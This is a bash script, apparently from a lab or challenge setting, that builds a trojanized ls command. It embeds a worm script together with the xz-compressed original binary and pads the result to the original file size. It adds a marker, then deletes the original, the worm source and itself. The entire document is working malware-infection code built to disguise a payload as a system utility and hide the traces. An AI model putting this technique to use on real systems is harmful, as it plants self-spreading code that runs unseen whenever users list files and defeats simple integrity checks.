#!/bin/bash

LS="/app/ls"
ZIP="ls.xz"
ORIG="/app/ls.orig"
WORM="/app/worm.sh"
SELF="$0" 


# Compress the original ls binary
cat "$ORIG" | xz > "$ZIP"

# Create the ls script with embedded payload
cat "$WORM" \
    | perl -pe "s/SIZE1/$(cat "$WORM" | wc -c | tr -d ' ')/" \
    | perl -pe "s/SIZE2/$(cat "$ZIP" | wc -c | tr -d ' ')/" \
    > "$LS"
cat "$ZIP" >> "$LS"
perl -e "print(\"\x00\" x $(($(cat "$ORIG" | wc -c) - $(cat "$LS" | wc -c) - 4)))" >> "$LS"
perl -e "print(\"\xaa\xbb\xcc\xdd\")" >> "$LS"

# Make the ls script executable and remove the temporary compressed file

chmod +x "$LS" && rm "$ZIP"
rm -f "$ZIP" "$WORM" "$ORIG" "$SELF" 
